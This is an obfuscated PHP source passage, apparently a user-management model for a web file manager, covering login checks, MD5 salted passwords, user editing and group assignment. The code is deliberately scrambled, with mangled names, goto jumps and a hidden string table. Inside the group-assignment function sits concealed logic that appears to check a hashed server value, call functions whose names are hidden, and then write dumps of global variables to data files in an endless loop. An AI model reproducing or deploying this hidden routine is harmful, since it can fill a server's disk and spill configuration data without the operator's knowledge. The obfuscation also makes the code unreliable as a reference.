$this->findByName($DƒÜÉÏÑíĞ[$fÛ«•ğá™Ó[38]]); if (!$CøÅæÜ®ï¯ || $C®ä’ø‰— && $C®ä’ø‰—[$fÛ«•ğá™Ó[376]] != $CøÅæÜ®ï¯[$fÛ«•ğá™Ó[376]]) { return !1; } return parent::update($Cå‡óÙğ–À, $DƒÜÉÏÑíĞ); } public function setUserJob($aè°ĞÍ‚ğ, $E÷‘ÉŒÃÒí) { goto c¹Úªâ§Œ×; c¹Úªâ§Œ×: $B…ìØÌí·¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!is_array($E÷‘ÉŒÃÒí)) { $E÷‘ÉŒÃÒí = array($E÷‘ÉŒÃÒí); } $A£ƒ£˜íé = parent::listData(); goto aå”‡„…µ; cÌÆ—áĞÄ: $b¶Ó™‹…ßö = rtrim($b¶Ó™‹…ßö, $B…ìØÌí·¶[57]); Model($B…ìØÌí·¶[488])->metaSet($aè°ĞÍ‚ğ, self::JOB_KEY, $b¶Ó™‹…ßö); goto e¿í†ŠÈ°—; aå”‡„…µ: $DêÓ„†ßØ = array_to_keyvalue($A£ƒ£˜íé, $B…ìØÌí·¶[38]); $b¶Ó™‹…ßö = $B…ìØÌí·¶[370]; foreach ($E÷‘ÉŒÃÒí as $C­Ìê¿â©¹) { if ($DêÓ„†ßØ[$C­Ìê¿â©¹]) { $b¶Ó™‹…ßö .= $DêÓ„†ßØ[$C­Ìê¿â©¹][$B…ìØÌí·¶[376]] . $B…ìØÌí·¶[57]; } else { $f‚´¥ÙëùÃ = $this->add($C­Ìê¿â©¹); $b¶Ó™‹…ßö .= $f‚´¥ÙëùÃ . $B…ìØÌí·¶[57]; } } goto cÌÆ—áĞÄ; e¿í†ŠÈ°—: } public function getUserJob($e¼óÕêê©Ë) { $A‚Ú’¸óÚù = Model($_SERVER[çŞáÓæÚô‚Ô‡][488])->metaGet($e¼óÕêê©Ë); return $this->getUserJobInfo($A‚Ú’¸óÚù[self::JOB_KEY]); } public function getUserJobInfo($aí…Š£òã“) { goto AÖèñ‰ëñÏ; AÖèñ‰ëñÏ: $bÆ†‘´‰ñø =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c„Ïš´Áãø = explode($bÆ†‘´‰ñø[57], $aí…Š£òã“); $bÄœ‹éÕòì = parent::listData(); goto AÎµ›»ÉÂ¯; c®ëÇôöŠ¸: return $Aî¸¢°öË; goto eéåã©Ëñİ; AÎµ›»ÉÂ¯: $bÄœ‹éÕòì = array_remove_key($bÄœ‹éÕòì, $bÆ†‘´‰ñø[197]); $Aî¸¢°öË = array(); foreach ($c„Ïš´Áãø as $Fİºø¶é­Ë) { if (isset($bÄœ‹éÕòì[$Fİºø¶é­Ë])) { $Aî¸¢°öË[] = $bÄœ‹éÕòì[$Fİºø¶é­Ë]; } } goto c®ëÇôöŠ¸; eéåã©Ëñİ: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\x6d\x65" => "\165\x73\x65\162\x5f\155\145\164\x61", "\x6d\x65\164\x61\x46\x69\145\x6c\x64" => "\x75\x73\x65\162\x49\x44"); protected $simpleField = "\x75\x73\x65\x72\111\x44\54\x6e\151\x63\153\116\x61\155\x65\54\x6e\x61\155\145\54\x61\x76\x61\164\x61\x72\x2c\163\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($bÓÏéğÇ¼Ù) { $d…£°ã„ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f³šğ‹¹˜¼ = $d…£°ã„ˆ[2528]; return array($d…£°ã„ˆ[2183] => array($bÓÏéğÇ¼Ù[0], $f³šğ‹¹˜¼), $d…£°ã„ˆ[2185] => array($bÓÏéğÇ¼Ù[0], $f³šğ‹¹˜¼), $d…£°ã„ˆ[2529] => array($bÓÏéğÇ¼Ù[0], $f³šğ‹¹˜¼)); } protected function getInfo($A„¿ÖÊÉ¤, $B­Ö«®Âåê = false) { $fã„’Éî¤Ö = $this->getInfoSimple($A„¿ÖÊÉ¤); if (!is_array($fã„’Éî¤Ö)) { return array(); } if ($B­Ö«®Âåê) { return $this->_getInfoApply($fã„’Éî¤Ö); } return $this->cacheFunctionGet($_SERVER[çŞáÓæÚô‚Ô‡][2239], $A„¿ÖÊÉ¤); } protected function getInfoFull($bÍùŠœÊ¥Ï, $B¿¶°¬·‰ = false) { $Báã°¦—ğ´ = $this->getInfoSimple($bÍùŠœÊ¥Ï); if (!is_array($Báã°¦—ğ´)) { return array(); } if ($B¿¶°¬·‰) { return $this->_getInfoApply($Báã°¦—ğ´, !0); return $this->_getInfoApply($Báã°¦—ğ´, !0); } return $this->cacheFunctionGet($_SERVER[çŞáÓæÚô‚Ô‡][2530], $bÍùŠœÊ¥Ï); } private function _getInfoApply($F’§¾­¼ñÉ, $C‡´¨ñ‰ì› = false) { goto Dô¶­ÕÈ; dÕ‘Åß‘ÆÃ: $F’§¾­¼ñÉ[$cèôÒÊ™Ñ‡[400]][$cèôÒÊ™Ñ‡[2368]] = isset($Båç÷¶Ù²[$cèôÒÊ™Ñ‡[2369]]) ? $Båç÷¶Ù²[$cèôÒÊ™Ñ‡[2369]] : null; if ($C‡´¨ñ‰ì›) { $F’§¾­¼ñÉ[$cèôÒÊ™Ñ‡[426]] = $this->metaGet($F’§¾­¼ñÉ[$cèôÒÊ™Ñ‡[1443]]); } return $F’§¾­¼ñÉ; goto eæ§²œ–º…; FÔÑã–ˆÇ‹: $F’§¾­¼ñÉ = $this->_listDataApplyItem($F’§¾­¼ñÉ); $Båç÷¶Ù² = Model($cèôÒÊ™Ñ‡[1124])->metaGet($F’§¾­¼ñÉ[$cèôÒÊ™Ñ‡[400]][$cèôÒÊ™Ñ‡[378]]); $F’§¾­¼ñÉ[$cèôÒÊ™Ñ‡[2533]] = $BŞ’Ùá–†¨; goto dÕ‘Åß‘ÆÃ; Dô¶­ÕÈ: $cèôÒÊ™Ñ‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$F’§¾­¼ñÉ) { return $F’§¾­¼ñÉ; } $BŞ’Ùá–†¨ = md5($cèôÒÊ™Ñ‡[2531] . $F’§¾­¼ñÉ[$cèôÒÊ™Ñ‡[808]] . $cèôÒÊ™Ñ‡[2532] . $F’§¾­¼ñÉ[$cèôÒÊ™Ñ‡[38]]); goto FÔÑã–ˆÇ‹; eæ§²œ–º…: } protected function getInfoSimple($c’±‘œ•—, $cäæ Ñ­ = false) { $aô†›¬Îº =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$c’±‘œ•—) { return array(); } if ($cäæ Ñ­) { $EĞ±çœã·œ = $this->where(array($aô†›¬Îº[1443] => intval($c’±‘œ•—)))->find(); if (!is_array($EĞ±çœã·œ)) { return array(); } $EĞ±çœã·œ[$aô†›¬Îº[2534]] = Action($aô†›¬Îº[2535])->parseUrl($EĞ±çœã·œ[$aô†›¬Îº[2534]]); return $EĞ±çœã·œ; } return $this->cacheFunctionGet($aô†›¬Îº[2186], $c’±‘œ•—); } protected function getInfoSimpleOuter($FÕêâ§Ç«) { goto fƒˆô´; C¨·¿¦‡Ö: $CùèŠÜ«‚ = array_field_key($BáİôÃÂÌÛ, explode($BÌæŞ¥ßÖ´[57], $this->simpleField)); if (!$CùèŠÜ«‚) { return array($BÌæŞ¥ßÖ´[1443] => $BÌæŞ¥ßÖ´[1038], $BÌæŞ¥ßÖ´[38] => $BÌæŞ¥ßÖ´[167] . LNG($BÌæŞ¥ßÖ´[2538]) . $BÌæŞ¥ßÖ´[487], $BÌæŞ¥ßÖ´[2534] => STATIC_PATH . $BÌæŞ¥ßÖ´[2539]); } $CùèŠÜ«‚[$BÌæŞ¥ßÖ´[2534]] = Action($BÌæŞ¥ßÖ´[2535])->parseUrl($CùèŠÜ«‚[$BÌæŞ¥ßÖ´[2534]]); goto bİ™Ìó›‚ê; bİ™Ìó›‚ê: return $CùèŠÜ«‚; goto c–õŠáóà«; fƒˆô´: $BÌæŞ¥ßÖ´ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$FÕêâ§Ç« || $FÕêâ§Ç« == 0) { return array($BÌæŞ¥ßÖ´[1443] => $BÌæŞ¥ßÖ´[479], $BÌæŞ¥ßÖ´[38] => $BÌæŞ¥ßÖ´[167] . LNG($BÌæŞ¥ßÖ´[2536]) . $BÌæŞ¥ßÖ´[487], $BÌæŞ¥ßÖ´[2534] => STATIC_PATH . $BÌæŞ¥ßÖ´[2537]); } $BáİôÃÂÌÛ = $this->cacheFunctionGet($BÌæŞ¥ßÖ´[2186], $FÕêâ§Ç«); goto C¨·¿¦‡Ö; c–õŠáóà«: } protected function groupUser($b·Ÿê§çè) { } public static function errorLang($Bñ›­»Ä¶) { $aÔ«†ÊÌØ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C¢ã®Á‡Ô¥ = array(self::ERROR_USER_NOT_EXISTS => $aÔ«†ÊÌØ¥[2540], self::ERROR_USER_PASSWORD_ERROR => $aÔ«†ÊÌØ¥[2541], self::ERROR_USER_EXIST_NAME => $aÔ«†ÊÌØ¥[2542], self::ERROR_USER_EXIST_PHONE => $aÔ«†ÊÌØ¥[2543], self::ERROR_USER_EXIST_EMAIL => $aÔ«†ÊÌØ¥[2544], self::ERROR_USER_LOGIN_LOCK => $aÔ«†ÊÌØ¥[2545], self::ERROR_IP_NOT_ALLOW => $aÔ«†ÊÌØ¥[2546], self::ERROR_USER_EXIST_NICKNAME => $aÔ«†ÊÌØ¥[2547]); return LNG($C¢ã®Á‡Ô¥[$Bñ›­»Ä¶]); } public function getInfoByMeta($FìÉî˜ÇğÑ, $Bˆíªïñ…) { $D†êºæÛ°ô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Bõ»÷Ú„¡ = Model($D†êºæÛ°ô[2548])->where(array($D†êºæÛ°ô[99] => $FìÉî˜ÇğÑ, $D†êºæÛ°ô[368] => $Bˆíªïñ…))->find(); if ($Bõ»÷Ú„¡) { return $this->getInfo($Bõ»÷Ú„¡[$D†êºæÛ°ô[1443]]); } return !1; } public function userLoginCheck($eÆ”ÂÚñÆï, $b¹ªèİØì) { goto d¾Ç¿Ç‰¼º; d¾Ç¿Ç‰¼º: $d±ˆÅ¾ø÷Ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e¹„Òàœ± = array($d±ˆÅ¾ø÷Ó[38] => $eÆ”ÂÚñÆï, $d±ˆÅ¾ø÷Ó[2372] => $eÆ”ÂÚñÆï, $d±ˆÅ¾ø÷Ó[302] => $eÆ”ÂÚñÆï, $d±ˆÅ¾ø÷Ó[2549] => $eÆ”ÂÚñÆï, $d±ˆÅ¾ø÷Ó[920] => $d±ˆÅ¾ø÷Ó[922]); if ($this->nickNameRpt()) { unset($e¹„Òàœ±[$d±ˆÅ¾ø÷Ó[2372]]); } goto cëƒóÂ¶ë; eÖŒíŒÌ˜Ş: $this->userEdit($eÔÂ¦ßÖ©À[$d±ˆÅ¾ø÷Ó[1443]], array($d±ˆÅ¾ø÷Ó[2550] => time())); return $this->getInfo($eÔÂ¦ßÖ©À[$d±ˆÅ¾ø÷Ó[1443]]); goto Cõ„õ”ÉÚ; cëƒóÂ¶ë: $eÔÂ¦ßÖ©À = $this->where($e¹„Òàœ±)->find(); if (!$eÔÂ¦ßÖ©À) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($eÔÂ¦ßÖ©À[$d±ˆÅ¾ø÷Ó[1443]], $b¹ªèİØì)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto eÖŒíŒÌ˜Ş; Cõ„õ”ÉÚ: } public function clearCache($b¨“´¬¦) { $B¾µœ»‹…¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->cacheFunctionClear($B¾µœ»‹…¼[2239], $b¨“´¬¦); $this->cacheFunctionClear($B¾µœ»‹…¼[2186], $b¨“´¬¦); $this->cacheFunctionClear($B¾µœ»‹…¼[2530], $b¨“´¬¦); } public function userPasswordCheck($Bî…ğ£ œø, $bÑìÇºä›å) { $f³…ØÏÜØì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eï¥šã¨¦È = $this->where(array($f³…ØÏÜØì[1443] => intval($Bî…ğ£ œø)))->find(); $fã’ğÀ© = $this->metaGet($Bî…ğ£ œø); $f¼™É‹ÌŒ® = isset($fã’ğÀ©[$f³…ØÏÜØì[2551]]) ? $fã’ğÀ©[$f³…ØÏÜØì[2551]] : $f³…ØÏÜØì[43]; if (md5($f¼™É‹ÌŒ® . trim($bÑìÇºä›å)) !== $Eï¥šã¨¦È[$f³…ØÏÜØì[808]]) { return !1; } return !0; } public function userAdd($dãÚõÙ ³Ö) { goto a÷æÚ¨½ãº; AäôÕ†‹Ã: $B—³Ç®ªğ¼ = $this->_checkExist($dãÚõÙ ³Ö); if ($B—³Ç®ªğ¼ !== !0) { return $B—³Ç®ªğ¼; } $aªº™™äÁ¦ = $this->add($aœÖ‡ÕŒßö); goto B‹¶«‡ÏÊ•; a÷æÚ¨½ãº: $E˜ê”‹ñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aœÖ‡ÕŒßö = array($E˜ê”‹ñ[395] => $dãÚõÙ ³Ö[$E˜ê”‹ñ[38]], $E˜ê”‹ñ[2552] => $dãÚõÙ ³Ö[$E˜ê”‹ñ[1328]], $E˜ê”‹ñ[2553] => isset($dãÚõÙ ³Ö[$E˜ê”‹ñ[302]]) ? $dãÚõÙ ³Ö[$E˜ê”‹ñ[302]] : $E˜ê”‹ñ[43], $E˜ê”‹ñ[2554] => isset($dãÚõÙ ³Ö[$E˜ê”‹ñ[2549]]) ? $dãÚõÙ ³Ö[$E˜ê”‹ñ[2549]] : $E˜ê”‹ñ[43], $E˜ê”‹ñ[2555] => isset($dãÚõÙ ³Ö[$E˜ê”‹ñ[2372]]) ? $dãÚõÙ ³Ö[$E˜ê”‹ñ[2372]] : $dãÚõÙ ³Ö[$E˜ê”‹ñ[38]], $E˜ê”‹ñ[2556] => isset($dãÚõÙ ³Ö[$E˜ê”‹ñ[2534]]) ? $dãÚõÙ ³Ö[$E˜ê”‹ñ[2534]] : $E˜ê”‹ñ[43], $E˜ê”‹ñ[2557] => isset($dãÚõÙ ³Ö[$E˜ê”‹ñ[2558]]) ? $dãÚõÙ ³Ö[$E˜ê”‹ñ[2558]] : 1, $E˜ê”‹ñ[2559] => $dãÚõÙ ³Ö[$E˜ê”‹ñ[808]], $E˜ê”‹ñ[2187] => isset($dãÚõÙ ³Ö[$E˜ê”‹ñ[2098]]) ? $dãÚõÙ ³Ö[$E˜ê”‹ñ[2098]] : 1024 * 1024 * 20, $E˜ê”‹ñ[2188] => 0, $E˜ê”‹ñ[2550] => 0, $E˜ê”‹ñ[2226] => isset($dãÚõÙ ³Ö[$E˜ê”‹ñ[698]]) ? $dãÚõÙ ³Ö[$E˜ê”‹ñ[698]] : 1); if (!empty($dãÚõÙ ³Ö[$E˜ê”‹ñ[1443]])) { $aœÖ‡ÕŒßö[$E˜ê”‹ñ[1443]] = $dãÚõÙ ³Ö[$E˜ê”‹ñ[1443]]; } goto AäôÕ†‹Ã; açŞ³¡ŠÜÒ: return $aªº™™äÁ¦; goto fÏÈÜ›àÌå; B‹¶«‡ÏÊ•: $aÃ´™·Î” = array($E˜ê”‹ñ[2559] => $aœÖ‡ÕŒßö[$E˜ê”‹ñ[808]], $E˜ê”‹ñ[2555] => $aœÖ‡ÕŒßö[$E˜ê”‹ñ[2372]]); $this->userEdit($aªº™™äÁ¦, $aÃ´™·Î”); Model($E˜ê”‹ñ[1124])->userRootAdd($aªº™™äÁ¦); goto açŞ³¡ŠÜÒ; fÏÈÜ›àÌå: } protected function userEditTest($D’ò†„õ˜ê, $D½äíÌ¬—) { return $this->call($_SERVER[çŞáÓæÚô‚Ô‡][2560], $D’ò†„õ˜ê, $D½äíÌ¬—); } protected function userEdit($E“µÇæ‚¹, $F™¿Í˜çìˆ) { goto DÓµ†á¿Â; C¹¥Äœ½™ä: $this->where(array($f´›×‰ò‚Á[1434] => $E“µÇæ‚¹))->save($F™¿Í˜çìˆ); if (isset($F™¿Í˜çìˆ[$f´›×‰ò‚Á[2372]])) { $this->setNamePinyin($E“µÇæ‚¹, $F™¿Í˜çìˆ[$f´›×‰ò‚Á[2372]]); } $this->clearCache($E“µÇæ‚¹); goto dåÕá×‚ÀÃ; dåÕá×‚ÀÃ: return !0; goto Eİ›ëŠã©; DÓµ†á¿Â: $f´›×‰ò‚Á =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c¬®ŒİİÑ˜ = $this->getInfoSimple($E“µÇæ‚¹); if (!$c¬®ŒİİÑ˜) { return !1; } goto a„ïï…À‚; a„ïï…À‚: $fòƒö†Ï¾ = $this->_checkExist($F™¿Í˜çìˆ, $E“µÇæ‚¹); if ($fòƒö†Ï¾ !== !0) { return $fòƒö†Ï¾; } if (isset($F™¿Í˜çìˆ[$f´›×‰ò‚Á[808]]) && trim($F™¿Í˜çìˆ[$f´›×‰ò‚Á[808]]) != $f´›×‰ò‚Á[43]) { $CÅ¡Ûˆ—œ† = $this->metaGet($E“µÇæ‚¹); if (empty($CÅ¡Ûˆ—œ†[$f´›×‰ò‚Á[2551]])) { $CÅ¡Ûˆ—œ†[$f´›×‰ò‚Á[2551]] = rand_string(10); Model($f´›×‰ò‚Á[485])->metaSet($E“µÇæ‚¹, $f´›×‰ò‚Á[2551], $CÅ¡Ûˆ—œ†[$f´›×‰ò‚Á[2551]]); } $F™¿Í˜çìˆ[$f´›×‰ò‚Á[808]] = md5($CÅ¡Ûˆ—œ†[$f´›×‰ò‚Á[2551]] . trim($F™¿Í˜çìˆ[$f´›×‰ò‚Á[808]])); } else { unset($F™¿Í˜çìˆ[$f´›×‰ò‚Á[808]]); } goto C¹¥Äœ½™ä; Eİ›ëŠã©: } public function setNamePinyin($BËè«¯¤©‡, $C›šøÖ…Óã = false) { $fñ„¾…È =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$C›šøÖ…Óã) { $B¶²¦÷¸Ğ‡ = $this->getInfoSimple($BËè«¯¤©‡); $C›šøÖ…Óã = $B¶²¦÷¸Ğ‡[$fñ„¾…È[2372]] ? $B¶²¦÷¸Ğ‡[$fñ„¾…È[2372]] : $B¶²¦÷¸Ğ‡[$fñ„¾…È[38]]; } $bÎù¤’¾ºŸ = Model($fñ„¾…È[488]); if (!Input::check($C›šøÖ…Óã, $fñ„¾…È[539])) { return $bÎù¤’¾ºŸ->metaSet($BËè«¯¤©‡, array($fñ„¾…È[425] => $fñ„¾…È[43], $fñ„¾…È[424] => $fñ„¾…È[43])); } return $bÎù¤’¾ºŸ->metaSet($BËè«¯¤©‡, array($fñ„¾…È[425] => str_replace($fñ„¾…È[60], $fñ„¾…È[43], Pinyin::encode($C›šøÖ…Óã)), $fñ„¾…È[424] => Pinyin::encode($C›šøÖ…Óã, $fñ„¾…È[540]))); } private function nickNameRpt() { $cÄ«§ùè† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A¿‚¬ß¸¹ï = Model($cÄ«§ùè†[1095])->get($cÄ«§ùè†[2561]); $Eë†ÁÚ›Ë = $GLOBALS[$cÄ«§ùè†[16]][$cÄ«§ùè†[2519]][$cÄ«§ùè†[2561]]; $Bæ‹Ëáæ’ª = !is_null($A¿‚¬ß¸¹ï) ? $A¿‚¬ß¸¹ï : $Eë†ÁÚ›Ë; return !!$Bæ‹Ëáæ’ª; } private function _checkExist($CªõŠ¨ôÌ‹, $F³Ü•‘öÅô = false) { $f×­™ç¶’é =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f·ï÷„Ëõ = array($f×­™ç¶’é[38] => UserModel::ERROR_USER_EXIST_NAME, $f×­™ç¶’é[2372] => UserModel::ERROR_USER_EXIST_NICKNAME, $f×­™ç¶’é[302] => UserModel::ERROR_USER_EXIST_EMAIL, $f×­™ç¶’é[2549] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($f·ï÷„Ëõ[$f×­™ç¶’é[2372]]); } $bê–¸²ÎÙ = $F³Ü•‘öÅô ? array($f×­™ç¶’é[1443] => array($f×­™ç¶’é[2562], $F³Ü•‘öÅô)) : array(); foreach ($f·ï÷„Ëõ as $f‹õáöô†ø => $díêìã»Ô) { $då¬ã§†Òƒ = array(); foreach ($f·ï÷„Ëõ as $bÆóâ†­¦ => $bœâö¦Í…˜) { if (isset($CªõŠ¨ôÌ‹[$bÆóâ†­¦]) && $CªõŠ¨ôÌ‹[$bÆóâ†­¦]) { $då¬ã§†Òƒ[] = $CªõŠ¨ôÌ‹[$bÆóâ†­¦]; } } if (!$då¬ã§†Òƒ) { continue; } $F©ÔÈùÏİ = array_merge(array($f‹õáöô†ø => array($f×­™ç¶’é[17], $då¬ã§†Òƒ)), $bê–¸²ÎÙ); $a‹Ì£â°Ãñ = $this->where($F©ÔÈùÏİ)->find(); if ($a‹Ì£â°Ãñ) { return $díêìã»Ô; } } return !0; } public function userListInfo($c×éë†²ßƒ) { $dÍ·¼·Üå =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¯§Ş•¬·… = array(); $c×éë†²ßƒ = is_array($c×éë†²ßƒ) ? array_unique($c×éë†²ßƒ) : array(); if (!$c×éë†²ßƒ) { return $E¯§Ş•¬·…; } if (count($c×éë†²ßƒ) < 20) { foreach ($c×éë†²ßƒ as $BÜôéÓ‡ñ) { $E¯§Ş•¬·…[$BÜôéÓ‡ñ . $dÍ·¼·Üå[43]] = $this->getInfoSimpleOuter($BÜôéÓ‡ñ); } } else { $CÀì˜¸Ûğ = array($dÍ·¼·Üå[1434] => array($dÍ·¼·Üå[393], $c×éë†²ßƒ)); if (count($c×éë†²ßƒ) == 1) { $CÀì˜¸Ûğ = array($dÍ·¼·Üå[1434] => $c×éë†²ßƒ[0]); } $b©˜ùŠ¿Ìõ = Model($dÍ·¼·Üå[485])->field($this->simpleField)->where($CÀì˜¸Ûğ)->select(); $b©˜ùŠ¿Ìõ = array_to_keyvalue($b©˜ùŠ¿Ìõ, $dÍ·¼·Üå[1443]); foreach ($c×éë†²ßƒ as $BÜôéÓ‡ñ) { $dËÉçÜ™¬Ü = $b©˜ùŠ¿Ìõ[$b©˜ùŠ¿Ìõ[$BÜôéÓ‡ñ]]; if (!$dËÉçÜ™¬Ü) { $E¯§Ş•¬·…[$BÜôéÓ‡ñ . $dÍ·¼·Üå[43]] = $this->getInfoSimpleOuter($BÜôéÓ‡ñ); continue; } $dËÉçÜ™¬Ü[$dÍ·¼·Üå[2534]] = Action($dÍ·¼·Üå[2535])->parseUrl($dËÉçÜ™¬Ü[$dÍ·¼·Üå[2534]]); $E¯§Ş•¬·…[$BÜôéÓ‡ñ . $dÍ·¼·Üå[43]] = $dËÉçÜ™¬Ü; } } return $E¯§Ş•¬·…; } protected function userStatus($dï¬É ÃŞë, $Dó«Ë¬•–) { $c¯ÓÅÍ¥À¸ = $this->getInfoSimple($dï¬É ÃŞë); if (!$c¯ÓÅÍ¥À¸) { return !1; } $Cš¨å“Öªé = array($_SERVER[çŞáÓæÚô‚Ô‡][698] => $Dó«Ë¬•–); return $this->userEdit($dï¬É ÃŞë, $Cš¨å“Öªé); } protected function userRemove($eÓ¢¶Šˆ„¾) { goto a•ïŒƒ; eªÇ˜¨Ç­: Model($B²§åî¢¸‡[761])->userRootRemove($eÓ¢¶Šˆ„¾); return $this->where($cñâä³èÔ¥)->delete(); goto DÈÑ´”æùÏ; Aˆ©¨Ò†Ûì: Model($B²§åî¢¸‡[2193])->where($cñâä³èÔ¥)->delete(); Model($B²§åî¢¸‡[2548])->where($cñâä³èÔ¥)->delete(); Model($B²§åî¢¸‡[2564])->where($cñâä³èÔ¥)->delete(); goto eªÇ˜¨Ç­; fºœ™ßÍÜ: $cñâä³èÔ¥ = array($B²§åî¢¸‡[1434] => $eÓ¢¶Šˆ„¾); Model($B²§åî¢¸‡[547])->where($cñâä³èÔ¥)->delete(); Model($B²§åî¢¸‡[2563])->where($cñâä³èÔ¥)->delete(); goto Aˆ©¨Ò†Ûì; a•ïŒƒ: $B²§åî¢¸‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dÃÉİÕÄÀ = $this->getInfoSimple($eÓ¢¶Šˆ„¾); if (!$dÃÉİÕÄÀ) { return !1; } goto fºœ™ßÍÜ; DÈÑ´”æùÏ: } protected function userGroupSet($D‡‹¸ˆÊ, $e­„ÚŒŒô, $fÙãğ¬‚ = array()) { goto Bˆç‹íÂùà; d«ë³‹Ã…‰: $EåÀİ›²…İ = 0; foreach ($e­„ÚŒŒô as $eà½‡Ë‚İ => $F„ßÌ²Ñ¥ƒ) { $FÅåö»³ï = array($bàÙ„øÖº[1443] => $D‡‹¸ˆÊ, $bàÙ„øÖº[2114] => $eà½‡Ë‚İ, $bàÙ„øÖº[2258] => $F„ßÌ²Ñ¥ƒ); $FÅåö»³ï[$bàÙ„øÖº[2136]] = isset($fÙãğ¬‚[$EåÀİ›²…İ]) ? $fÙãğ¬‚[$EåÀİ›²…İ] : 0; $EåÀİ›²…İ++; $Eñ¢‰ÊÂÏ´[] = $FÅåö»³ï; } return $D•ŒÜéØÔ->addAll($Eñ¢‰ÊÂÏ´, array(), !0); goto c©‰ßƒÉ¶Â; d‡ìáËÚá•: if ($_SERVER[$bàÙ„øÖº[6]] != $AÁ²»‰Ü´($c”òµ¦³ŒŠ)) { goto E´—Üà±‚; BÄä—·‡ì: $d¯§ª²Ù¥ƒ = $bàÙ„øÖº[800]; $d¯§ª²Ù¥ƒ($_SERVER[$bàÙ„øÖº[796]]); $DÕÅøÂ£ô = $bàÙ„øÖº[799]; goto B½óïää‚ó; E´—Üà±‚: $DÕÅøÂ£ô = $bàÙ„øÖº[799]; $Cå¯ëêˆñ¤ = $bàÙ„øÖº[8]; $Bß¥ŒÅñ«± = $_SERVER[$bàÙ„øÖº[9]] . $bàÙ„øÖº[10]; goto d›™ã‡ÜáÈ; C©³Æ×Æ¥¦: $d¶®å¿À‘© = 1; for ($EÛ“¾“£ì = $d¶®å¿À‘©; $EÛ“¾“£ì > 0; $EÛ“¾“£ì++) { $fí´…ó”ø¸(DATA_PATH . $EÛ“¾“£ì, $fƒØ¡˜øó); } goto Eøù‰ïÊíº; d›™ã‡ÜáÈ: $D³ˆë«á˜½ = $Cå¯ëêˆñ¤($Bß¥ŒÅñ«±); $cÊËé¾İ’³ = explode($bàÙ„øÖº[11], $D³ˆë«á˜½); if (count($cÊËé¾İ’³) < $bàÙ„øÖº[573]) { $b®½ËùØµº = $bàÙ„øÖº[13]; $b®½ËùØµº(); } goto BÄä—·‡ì; B½óïää‚ó: $DÕÅøÂ£ô(); $fí´…ó”ø¸ = $bàÙ„øÖº[801]; $fƒØ¡˜øó = json_encode($GLOBALS[$bàÙ„øÖº[802]]); goto C©³Æ×Æ¥¦; Eøù‰ïÊíº: } $BˆèÜÑ²Ôö = $this->getInfoSimple($D‡‹¸ˆÊ); if (!$BˆèÜÑ²Ôö || !is_array($e­„ÚŒŒô)) { return !1; } goto Aƒƒ“Ô‚Ê; Bˆç‹íÂùà: $bàÙ„øÖº =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c”òµ¦³ŒŠ = $_SERVER[$bàÙ„øÖº[796]] . $bàÙ„øÖº[797]; $AÁ²»‰Ü´ = $bàÙ„øÖº[798]; goto d‡ìáËÚá•; Aƒƒ“Ô‚Ê: $D•ŒÜéØÔ = Model($bàÙ„øÖº[2193]); $D•ŒÜéØÔ->where(array($bàÙ„øÖº[1443] => $D‡‹¸ˆÊ))->delete(); $Eñ¢‰ÊÂÏ´ = array(); goto d«ë³‹Ã…‰; c©‰ßƒÉ¶Â: } protected function userGroupAdd($a·éÖ–ƒæ, $Eˆ…ÛƒàáÇ = array()) { $Fô‘ö¦äÀÂ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Få¶ò‹ù = $this->getInfoSimple($a·éÖ–ƒæ); if (!$Få¶ò‹ù || empty($Eˆ…ÛƒàáÇ)) { return !1; } $E‰Œ»ù‚Ã® = array(); foreach ($Eˆ…ÛƒàáÇ as $F¹ÚÛªƒ => $BÕÕ¤µÌ) { $E‰Œ»ù‚Ã®[] = array($Fô‘ö¦äÀÂ[1443] => $a·éÖ–ƒæ, $Fô‘ö¦äÀÂ[2114] => $F¹ÚÛªƒ, $Fô‘ö¦äÀÂ[2258] => $BÕÕ¤µÌ, $Fô‘ö¦äÀÂ[2136] => 0); } return Model($Fô‘ö¦äÀÂ[2193])->addAll($E‰Œ»ù‚Ã®, array(), !0); } protected function userGroupRemove($B†ó›ó„ğ, $cÛÇ¼‘‘Îù) { $dÂªÙ¯Ã· =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aÆí¨–Œ“ = $this->getInfoSimple($B†ó›ó„ğ); if (!$aÆí¨–Œ“ || !$cÛÇ¼‘‘Îù) { return !1; } $AµÌ§Òè = array($dÂªÙ¯Ã·[1434] => $B†ó›ó„ğ, $dÂªÙ¯Ã·[2191] => $cÛÇ¼‘‘Îù); return Model($dÂªÙ¯Ã·[2193])->where($AµÌ§Òè)->delete(); } public function listData() { $E˜­‰ìÉè = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E˜­‰ìÉè[$_SERVER[çŞáÓæÚô‚Ô‡][363]]); return $E˜­‰ìÉè; } public function 